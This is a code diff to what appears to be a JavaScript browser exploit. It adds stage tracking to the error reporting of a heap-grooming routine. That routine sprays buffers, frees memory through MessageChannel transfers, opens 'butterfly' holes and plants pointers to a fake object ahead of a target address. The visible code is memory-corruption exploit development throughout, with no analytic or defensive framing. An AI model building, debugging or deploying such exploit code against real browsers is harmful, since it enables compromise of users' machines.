@@ -162,6 +162,7 @@ let identityResult = 0;
 let compositionState = 0;
 let compositionLength = 0;
 let compositionError = null;
+let compositionErrorStage = "";
 
 let liveCandidate = null;
 let fakeReleased = false;
@@ -603,6 +604,7 @@ function resetAttemptState() {
   compositionState = 0;
   compositionLength = 0;
   compositionError = null;
+  compositionErrorStage = "";
   liveCandidate = null;
   resetProfile();
   rwHeader.fill(0);
@@ -1140,19 +1142,23 @@ function loadHistoryCritical() {
 }
 
 function runGroomAndLoad() {
+  let stage = "enter";
   try {
     emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
     const channel = new MessageChannel();
     channel.port1.close();
     channel.port2.close();
 
+    stage = "drain";
     for (let i = 0; i < DRAIN_COUNT; ++i)
       keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
 
+    stage = "slab-transfer";
     let slab = buffer(SLAB_SIZE);
     channel.port1.postMessage(0, [slab]);
     slab = null;
 
+    stage = "holes";
     const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
     const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
     const separator = buffer(SEPARATOR_SIZE);
@@ -1161,6 +1167,7 @@ function runGroomAndLoad() {
     const predecessor = buffer(PREDECESSOR_SIZE);
     const finalHole = buffer(FINAL_HOLE_SIZE);
 
+    stage = "predecessor-fill";
     fillRawCellPointers(predecessor, fakeAddress);
     keepAlive[keepIndex++] = separator;
     keepAlive[keepIndex++] = guard;
@@ -1170,14 +1177,17 @@ function runGroomAndLoad() {
       `qwords=${PREDECESSOR_SIZE / 8}` + `-fake=${hex(fakeAddress)}`,
     );
 
+    stage = "critical-barrier";
     criticalBarrier(fakeAddress, targetAddress);
 
+    stage = "holes-transfer";
     channel.port1.postMessage(0, [
       butterflyHole1,
       butterflyHole2,
       earlyHole,
       finalHole,
     ]);
+    stage = "history-load";
     loadHistoryCritical();
   } catch (error) {
     try {
@@ -1185,6 +1195,7 @@ function runGroomAndLoad() {
     } catch {}
     retrySafe = true;
     compositionError = error;
+    compositionErrorStage = stage;
     compositionState = -1;
   }
   reportComposition();
@@ -1309,7 +1320,8 @@ function reportComposition() {
     emit(
       retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
       `${compositionError?.name}:` +
-        String(compositionError?.message).slice(0, 80),
+        String(compositionError?.message).slice(0, 80) +
+        `-stage=${compositionErrorStage || "unknown"}`,
     );
     if (!retrySafe) failed();
     else scheduleSafeRetry("placement-throw");
